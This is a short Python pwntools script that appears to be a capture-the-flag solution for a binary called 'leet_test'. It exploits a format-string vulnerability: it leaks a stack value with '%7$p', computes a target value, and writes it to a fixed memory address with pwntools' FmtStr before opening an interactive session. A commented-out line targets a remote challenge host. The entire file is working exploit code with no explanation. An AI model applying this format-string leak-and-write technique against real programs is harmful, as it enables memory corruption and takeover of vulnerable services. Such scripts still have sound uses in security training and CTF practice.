#!/usr/bin/python3

from pwn import *

def main():
	context.log_level = 'info' #Debug mode
	binary = './leet_test' #Binary name
	io = process(binary) #Starting the binary process
	#io = remote('138.68.141.81',31263)

	# Binary enumeration
	elf = context.binary = ELF(binary,checksec=False) #Automatically get contex,arch,os etc..
	multiply_value = 0x1337c0de #The value that we multiply our random value 
	winner = 0x404078 #Winner address

	#Leaking random value
	io.sendlineafter("name:",'%7$p')
	random_value = io.recvline()[-13:-9]
	random_value = int(random_value,16)
	log.success(f'Leaked random value: {random_value}')

	#Calculating winner value
	calculated_value = multiply_value * random_value
	print(calculated_value)

	#Execute payload
	def exec_fmt(payload): 
		io.sendlineafter("Please enter your name: ",payload)
		log.info(f'Payload sent')
		return io.recvline()

	format_string = FmtStr(execute_fmt=exec_fmt,offset = 10)
	format_string.write(winner, calculated_value) # write calculated_value to winner address
	format_string.execute_writes()

	io.interactive()

if __name__ == '__main__':
	main()
